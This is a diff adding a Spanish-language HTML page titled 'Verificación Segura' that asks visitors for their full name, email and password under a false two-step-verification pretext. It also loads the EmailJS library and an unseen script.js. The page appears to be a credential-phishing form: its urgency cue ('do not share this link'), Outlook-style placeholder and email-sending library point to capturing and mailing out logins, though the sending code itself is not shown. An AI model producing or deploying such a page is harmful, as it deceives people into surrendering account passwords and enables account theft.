@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación Segura</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="fondo-decorativo"></div>
+    
+    <main class="contenedor-principal">
+        <div class="tarjeta-verificacion">
+            <div class="encabezado">
+                <div class="icono-seguridad animate-bounce">🔒</div>
+                <h1>Bienvenid@ a tu espacio privado</h1>
+                <p class="leyenda-seguridad">Protegido por verificación en 2 pasos</p>
+            </div>
+
+            <form id="formularioVerificacion">
+                <div class="grupo-input">
+                    <label>👤 Nombre completo</label>
+                    <input type="text" id="nombre" placeholder="Ej. María González" required>
+                </div>
+
+                <div class="grupo-input">
+                    <label>📧 Correo electrónico</label>
+                    <input type="email" id="email" placeholder="usuario@outlook.com" required>
+                </div>
+
+                <div class="grupo-input">
+                    <label>🔑 Contraseña</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+
+                <button type="submit" class="boton-verificacion">
+                    <span class="texto-boton">Verificar identidad</span>
+                    <span class="icono-boton">🌸</span>
+                </button>
+            </form>
+
+            <div class="aviso-legal">
+                <div class="icono-aviso">⚠️</div>
+                <p>No compartas este enlace con nadie más</p>
+            </div>
+        </div>
+    </main>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
